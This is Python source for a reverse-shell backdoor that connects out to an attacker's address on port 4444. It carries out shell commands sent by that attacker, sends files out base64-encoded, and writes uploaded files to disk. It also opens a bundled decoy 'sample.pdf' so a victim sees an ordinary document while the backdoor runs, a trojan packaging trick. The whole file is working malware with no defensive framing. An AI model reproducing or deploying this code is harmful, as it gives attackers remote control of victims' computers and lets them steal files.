#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def reliable_recieve(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def reliable_send(self, data):
        try:
            data = data.decode()
        except:
            pass
        json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+]Changing working directory to " + path

    def read_file(self, path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self,path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+]upload Successful"

    def run(self):
        while True:
            command = self.reliable_recieve()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-]Error during command execution..."
            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

my_backdoor = Backdoor("ip", 4444)
my_backdoor.run()